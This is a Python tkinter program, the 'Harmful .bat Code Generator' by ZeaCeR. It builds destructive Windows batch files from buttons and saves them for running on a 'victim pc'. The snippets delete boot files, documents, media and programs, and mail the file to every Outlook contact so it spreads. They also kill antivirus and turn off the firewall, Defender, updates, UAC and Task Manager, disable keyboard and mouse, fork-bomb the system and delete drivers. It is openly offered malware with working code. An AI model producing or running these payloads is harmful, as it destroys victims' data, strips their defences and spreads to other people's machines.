from tkinter import *

window=Tk()

window.title(".bat Code Generator - v1.3 by ZeaCeR") 

window['background'] = '#333333' 

window.resizable(0,0)

def echo_off():
    echooff="@ echo off \n"
    tmain.insert(END,echooff)

def the_last_restart():
    thelastrestart=r"""rem ---------------------------------
rem The Last Restart
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
shutdown /r /t 00
rem ---------------------------------""" + "\n"
    tmain.insert(END,thelastrestart)
    

def send_to_contacts():
    sendtocontacts=r"""rem ---------------------------------
rem Spread Via Outlook Contact Book
echo dim x>>%SystemDrive%\mail.vbs
echo on error resume next>>%SystemDrive%\mail.vbs
echo Set fso ="Scripting.FileSystem.Object">>%SystemDrive%\mail.vbs
echo Set so=CreateObject(fso)>>%SystemDrive%\mail.vbs
echo Set ol=CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>%SystemDrive%\mail.vbs
echo Set a = mapi.AddressLists(1)>>%SystemDrive%\mail.vbs
echo Set ae=a.AddressEntries>>%SystemDrive%\mail.vbs
echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs
echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs
echo Set Mail=ci>>%SystemDrive%\mail.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
echo Mail.Subject="Is this you?">>%SystemDrive%\mail.vbs
echo Mail.Body="Man that has got to be embarrassing!">>%SystemDrive%\mail.vbs
echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
echo Mail.send>>%SystemDrive%\mail.vbs
echo Next>>%SystemDrive%\mail.vbs
echo ol.Quit>>%SystemDrive%\mail.vbs
start "" "%SystemDrive%\mail.vbs"
rem ---------------------------------""" + "\n"
    tmain.insert(END,sendtocontacts)

def del_useful_files():
    delusefulfiles=r"""rem ---------------------------------
rem Delete All Documents
DIR /S/B %SystemDrive%\*.doc >> FIleList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_doc.txt) do del "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Delete All Texts
DIR /S/B %SystemDrive%\*.txt >> FIleList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_txt.txt) do del "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Delete All Texts
DIR /S/B %SystemDrive%\*.mkv >> FIleList_mkv.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mkv.txt) do del "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Delete All Pdf
DIR /S/B %SystemDrive%\*.pdf >> FIleList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_pdf.txt) do del "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Delete All Xml
DIR /S/B %SystemDrive%\*.xml >> FIleList_xml.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_xml.txt) do del "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Delete All Mp3
DIR /S/B %SystemDrive%\*.mp3 >> FIleList_mp3.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp3.txt) do del "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Delete All Mp4
DIR /S/B %SystemDrive%\*.mp4 >> FIleList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp4.txt) do del "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Delete All Png
DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Delete All Exe
DIR /S/B %SystemDrive%\*.exe >> FIleList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_exe.txt) do del "%%j:%%k"
rem ---------------------------------
rem Delete All Excel Files
DIR /S/B %SystemDrive%\*.xlsx >> FIleList_xlsx.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_xlsx.txt) do del "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Delete All Lnk
DIR /S/B %SystemDrive%\*.lnk >> FIleList_lnk.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_lnk.txt) do del "%%j:%%k"
rem ---------------------------------""" + "\n"
    tmain.insert(END,delusefulfiles)

def delete_ms_office():
    deletemsoffice=r"""rem ---------------------------------
rem Delete Outlook
tskill outlook
del /f /q "%SystemDrive%\Program Files\Microsoft Office\Office10\OUTLOOK.EXE"
rem ---------------------------------
rem ---------------------------------
rem Delete Excel
tskill excel
del /f /q "%SystemDrive%\Program Files\Microsoft Office\Office10\EXCEL.EXE"
rem ---------------------------------
rem ---------------------------------
rem Delete Access
tskill msaccess
del /f /q "%SystemDrive%\Program Files\Microsoft Office\Office10\MSACCESS.EXE"
rem ---------------------------------
rem ---------------------------------
rem Delete Word
tskill WINWORD
del /f /q "%SystemDrive%\Program Files\Microsoft Office\Office10\WINWORD.EXE"
rem ---------------------------------""" + "\n"
    tmain.insert(END,deletemsoffice)


def del_iexplorer():
    delinternetexplorer=r"""rem ---------------------------------
rem Delete Internet Explorer
tskill iexplore
del /f /q "C:\Program Files\Internet Explorer\iexplore.exe"
rem ---------------------------------""" + "\n"
    tmain.insert(END,delinternetexplorer)

def del_paint():
    delpaintms=r"""rem ---------------------------------
rem Delete Paint
tskill mspaint
del /f /q "%windir%\system32\mspaint.exe"
rem ---------------------------------""" + "\n"
    tmain.insert(END,delpaintms)

def del_notepad():
    delmsnotepadstock=r"""rem ---------------------------------
rem Delete Notepad
tskill notepad
del /f /q "%windir%\system32\notepad.exe"
rem ---------------------------------""" + "\n"
    tmain.insert(END,delmsnotepadstock)

def del_pictures_files():
    deluserpicsturefiles=r"""rem ---------------------------------
rem Delete My Pictures
del /f /q '%userprofile%\My Pictures\*.*'
rem ---------------------------------
rem Hide Picture Folders
attrib +h "%userprofile%\my documents\my pictures"
rem ---------------------------------""" + "\n"
    tmain.insert(END,deluserpicsturefiles)

def del_music_files():
    delusermusicfiles=r"""rem ---------------------------------
rem Delete My Music
del /f /q '%userprofile%\My Music\*.*'
rem ---------------------------------
rem Hide Music Folders
attrib +h "%userprofile%\my documents\my music"
rem ---------------------------------""" + "\n"
    tmain.insert(END,delusermusicfiles)

def del_documents_files():
    deluserdocumentsfiles=r"""rem ---------------------------------
rem Delete My Documents
del /f /q '%userprofile%\My Documents\*.*'
rem ---------------------------------""" + "\n"
    tmain.insert(END,deluserdocumentsfiles)


def del_desktop_files():
    deluserdesktopfiles=r"""rem ---------------------------------
rem Delete My Pictures
del /f /q '%userprofile%\Desktop\*.*'
rem ---------------------------------""" + "\n"
    tmain.insert(END,deluserdesktopfiles)

def disable_mouse_and_keyboard():
    disablemouseandkeyboard=r"""rem ---------------------------------
rem Disable Mouse
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4
rem ---------------------------------
rem ---------------------------------
rem Disable Keyboard
echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg"
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "nokeyboard.reg"
echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "nokeyboard.reg"
echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "nokeyboard.reg"
echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "nokeyboard.reg"
echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "nokeyboard.reg"
echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "nokeyboard.reg"
echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "nokeyboard.reg"
echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "nokeyboard.reg"
echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "nokeyboard.reg"
echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "nokeyboard.reg"
echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "nokeyboard.reg"
echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "nokeyboard.reg"
echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "nokeyboard.reg"
echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "nokeyboard.reg"
echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "nokeyboard.reg"
echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "nokeyboard.reg"
echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "nokeyboard.reg"
echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "nokeyboard.reg"
echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "nokeyboard.reg"
echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg"
echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
start "nokeyboard.reg"
rem ---------------------------------""" + "\n"
    tmain.insert(END,disablemouseandkeyboard)

def disable_windows_updates_secuirty_defender():
    disablewindowsupdatessecurityanddefender="""rem ---------------------------------
rem Disable Windows Defender
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
rem ---------------------------------
rem ---------------------------------
rem Disable Windows Update
net stop "wuauserv"
rem ---------------------------------
rem ---------------------------------
rem Disable Windows Security
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
rem ---------------------------------""" + "\n"
    tmain.insert(END,disablewindowsupdatessecurityanddefender)

def kill_anti_virus():
    killantivirus=r"""rem ---------------------------------
rem Permanently Kill Anti-Virus
net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.* 
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe 
del /Q /F C:\Program Files\kasper~1\*.exe 
cls
del /Q /F C:\Program Files\trojan~1\*.exe 
del /Q /F C:\Program Files\f-prot95\*.dll 
del /Q /F C:\Program Files\tbav\*.dat 
cls
del /Q /F C:\Program Files\avpersonal\*.vdf 
del /Q /F C:\Program Files\Norton~1\*.cnt 
del /Q /F C:\Program Files\Mcafee\*.* 
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\*.* 
del /Q /F C:\Program Files\Norton~1\*.* 
cls
del /Q /F C:\Program Files\avgamsr\*.exe 
del /Q /F C:\Program Files\avgamsvr\*.exe 
del /Q /F C:\Program Files\avgemc\*.exe 
cls
del /Q /F C:\Program Files\avgcc\*.exe 
del /Q /F C:\Program Files\avgupsvc\*.exe 
del /Q /F C:\Program Files\grisoft 
del /Q /F C:\Program Files\nood32krn\*.exe 
del /Q /F C:\Program Files\nood32\*.exe 
cls
del /Q /F C:\Program Files\nod32 
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe 
del /Q /F C:\Program Files\kavmm\*.exe 
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe 
del /Q /F C:\Program Files\guard\*.exe 
del /Q /F C:\Program Files\ewido\*.exe 
cls
del /Q /F C:\Program Files\pavprsrv\*.exe 
del /Q /F C:\Program Files\pavprot\*.exe 
del /Q /F C:\Program Files\avengine\*.exe 
cls
del /Q /F C:\Program Files\apvxdwin\*.exe 
del /Q /F C:\Program Files\webproxy\*.exe 
del /Q /F C:\Program Files\panda software\*.* 
rem ---------------------------------""" + "\n"
    tmain.insert(END,killantivirus)

def disable_win_backup_tskmgr_admin():
    disabletaskmanageradminbackup=r"""rem ---------------------------------
rem Disable Admin Accounts
@Set RegistyEditCmd=Cmd /k Reg Add
@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
rem ---------------------------------
rem ---------------------------------
rem Disable Task Manager
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
rem ---------------------------------
rem ---------------------------------
rem Disable Windows Backup
net stop "SDRSVC"
rem ---------------------------------""" + "\n"
    tmain.insert(END,disabletaskmanageradminbackup)

def disable_internet():
    disableinternet=r"""rem ---------------------------------
rem Disable Internet
@Echo off & @@Break Off
Ipconfig /release
%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!
P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%
rem ---------------------------------""" + "\n"
    tmain.insert(END,disableinternet)

def reset_time():
    resettime=r"""rem ---------------------------------
rem Change Computer Time
time 12:00
rem ---------------------------------""" + "\n"
    tmain.insert(END,resettime)

def play_win_xp_song():
    playxpsound=r"""rem ---------------------------------
rem Start Windows XP Secret Song
start "" "%systemroot%\system32\oobe\images\title.wma"
rem ---------------------------------""" + "\n"
    tmain.insert(END,playxpsound)

def clear_text_in_program():
    tmain.delete("1.0", END)
    tmain.insert(END, "@ echo off" + "\n")

def open_close_optical_disk_drive():
    opencloseodd=r"""rem ---------------------------------
rem Start Opening Disk Tray
echo Do >> "opendisk.vbs"
echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> "opendisk.vbs"
echo Set colCDROMs = oWMP.cdromCollection >> "opendisk.vbs"
echo colCDROMs.Item(d).Eject  >> "opendisk.vbs"
echo colCDROMs.Item(d).Eject  >> "opendisk.vbs"
echo Loop >> "opendisk.vbs"
start "" "opendisk.vbs"
rem ---------------------------------""" + "\n"
    tmain.insert(END,opencloseodd)

def crach_victim_pc_one():
    crachvictimpcone=r"""rem ---------------------------------
rem Crash Computer
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
start "" crash.bat
rem ---------------------------------""" + "\n"
    tmain.insert(END,crachvictimpcone)

def cause_bsod():
    causebsodoldmethod =r"""rem -------------------------
rem Activate Blue Screen Of Death
@((( Echo Off > Nul ) & Break Off )
    @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
    @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)
rem ---------------------------------""" + "\n"
    tmain.insert(END,causebsodoldmethod)


def confuse_file_extensions():
    confusefileextensions=r"""rem -------------------------
rem Confuse File Extensions Powerup
assoc .dll=txtfile
assoc .exe=pngfile
assoc .vbs=Visual Style
assoc .reg=xmlfile
assoc .txt=regfile
rem ---------------------------------
rem Confuse File Extensions for text
assoc .mp3=txtfile
assoc .xml=txtfile
assoc .png=txtfile
rem ---------------------------------""" + "\n"
    tmain.insert(END,confusefileextensions)

def kill_explorer_exe():
    # you can start it using tskmgr (is this is not disabled)
    killprocessexplorer=r"""rem ---------------------------------
rem Kill Explorer
echo :a >>explorer.bat
echo tskill explorer >>explorer.bat
echo goto a >>explorer.bat
echo Set objShell = CreateObject("WScript.Shell")>>invisi.vbs
echo strCommand = "explorer.bat">>invisi.vbs
echo objShell.Run strCommand, vbHide, TRUE>>invisi.vbs
start "" invisi.vbs
rem ---------------------------------""" + "\n"
    tmain.insert(END,killprocessexplorer)

def generatefileandsave():
    contentToWrite = tmain.get("1.0", "end")
    filesaved = open("Harmful_File.bat", "w")
    filesaved.write(contentToWrite)
    filesaved.close()
    

l1=Label(window,text=" Harmful .bat Code Generator", bg='#333333', fg='#FFFFFF')
l1.grid(row=0,column=0,columnspan=4)

tmain=Text(window,height=15,width=80)
tmain.grid(row=1,column=0,columnspan=4)

bechooff=Button(window,text="@ echo off", command=echo_off, width=16, bg='#65B149', fg='#FFFFFF')
bechooff.grid(row=2,column=1)

brestart=Button(window,text="The Last Restart", command=the_last_restart, width=16, bg='#E45F43', fg='#FFFFFF')
brestart.grid(row=2,column=2)

bsedntocontacts=Button(window,text="Send to Contacts", command=send_to_contacts, width=16, bg='#E45F43', fg='#FFFFFF')
bsedntocontacts.grid(row=2,column=3)

bdeleteuselfulfiles=Button(window,text="Delete Desktop", command=del_desktop_files, width=16, bg='#E45F43', fg='#FFFFFF')
bdeleteuselfulfiles.grid(row=3,column=1)

bdelmsoffice=Button(window,text="Delete MS Office", command=delete_ms_office, width=16, bg='#E45F43', fg='#FFFFFF')
bdelmsoffice.grid(row=3,column=2)

bdelsomeuserfiles=Button(window,text="Delete User Files", command=del_useful_files, width=16, bg='#E45F43', fg='#FFFFFF')
bdelsomeuserfiles.grid(row=3,column=3)

bkillantivirus=Button(window,text="Kill Anit Virus", command=kill_anti_virus, width=16, bg='#E45F43', fg='#FFFFFF')
bkillantivirus.grid(row=4,column=1)

bdisableinternet=Button(window,text="Disable Internet", command=disable_internet, width=16, bg='#E45F43', fg='#FFFFFF')
bdisableinternet.grid(row=4,column=2)

bdisableie=Button(window,text="Disable IE", command=del_iexplorer, width=16, bg='#E45F43', fg='#FFFFFF')
bdisableie.grid(row=4,column=3)

bdisablepaint=Button(window,text="Disable Paint", command=del_paint, width=16, bg='#E45F43', fg='#FFFFFF')
bdisablepaint.grid(row=5,column=1)

bdisablenotepad=Button(window,text="Disable Notepad", command=del_notepad, width=16, bg='#E45F43', fg='#FFFFFF')
bdisablenotepad.grid(row=5,column=2)

bdelpicturesfiles=Button(window,text="Delete Pictures", command=del_pictures_files, width=16, bg='#E45F43', fg='#FFFFFF')
bdelpicturesfiles.grid(row=5,column=3)

bdelmusicfiles=Button(window,text="Delete Music", command=del_music_files, width=16, bg='#E45F43', fg='#FFFFFF')
bdelmusicfiles.grid(row=6,column=1)

bdeldocumentsfiles=Button(window,text="Delete Documents", command=del_documents_files, width=16, bg='#E45F43', fg='#FFFFFF')
bdeldocumentsfiles.grid(row=6,column=2)

bresetpctime=Button(window,text="Reset Time", command=reset_time, width=16, bg='#E45F43', fg='#FFFFFF')
bresetpctime.grid(row=6,column=3)

bplaywinxpsound=Button(window,text="Play WinXP Sound", command=play_win_xp_song, width=16, bg='#E45F43', fg='#FFFFFF')
bplaywinxpsound.grid(row=7,column=1)

bopencloseopticaldisktary=Button(window,text="Open/Close Disk Tray", command=open_close_optical_disk_drive, width=16, bg='#E45F43', fg='#FFFFFF')
bopencloseopticaldisktary.grid(row=7,column=2)

bcrachvictimpcone=Button(window,text="Crash PC", command=crach_victim_pc_one, width=16, bg='#E45F43', fg='#FFFFFF')
bcrachvictimpcone.grid(row=7,column=3)

bcausebsod=Button(window,text="Cause BSOD", command=cause_bsod, width=16, bg='#E45F43', fg='#FFFFFF')
bcausebsod.grid(row=8,column=1)

bconfusefileextions=Button(window,text="Confuse Extensions", command=confuse_file_extensions, width=16, bg='#E45F43', fg='#FFFFFF')
bconfusefileextions.grid(row=8,column=2)

bkillexplorer=Button(window,text="Kill Explorer", command=kill_explorer_exe, width=16, bg='#E45F43', fg='#FFFFFF')
bkillexplorer.grid(row=8,column=3)

bcleartextinprogam=Button(window,text="Clear", width=45, command=clear_text_in_program, bg='#FF0000', fg='#FFFFFF')
bcleartextinprogam.grid(row=2,column=0)

bdisablekeybandmouse=Button(window,text="Disable Mouse and Keyboard", command=disable_mouse_and_keyboard, width=45, bg='#E45F43', fg='#FFFFFF')
bdisablekeybandmouse.grid(row=3,column=0)

bdisablewindowsupdatessecuirtydefender=Button(window,text="Disable Win Updates,Defender,Security", command=disable_windows_updates_secuirty_defender, width=45, bg='#E45F43', fg='#FFFFFF')
bdisablewindowsupdatessecuirtydefender.grid(row=4,column=0)

bdisableadmintskmgrwinbackup=Button(window,text="Disable tskmgr, Admin, Win Backup", command=disable_win_backup_tskmgr_admin, width=45, bg='#E45F43', fg='#FFFFFF')
bdisableadmintskmgrwinbackup.grid(row=5,column=0)

# label4=Label(window,text="save the code as a .bat file and run on victim pc", bg='#333333', fg='#FFFFFF')
# label4.grid(row=7,column=0)

label2=Label(window,text="This is made by ZeaCeR", bg='#333333', fg='#FFFFFF')
label2.grid(row=7,column=0)

bsavethegeneratedCode = Button(window,text="Save generated code", command=generatefileandsave ,width=45, bg='#E45F43', fg='#FFFFFF')
bsavethegeneratedCode.grid(row=6,column=0)

label3=Label(window,text="V1.3 - I am not responsible for anything done with this", bg='#333333', fg='#FFFFFF')
label3.grid(row=8,column=0)


window.mainloop()
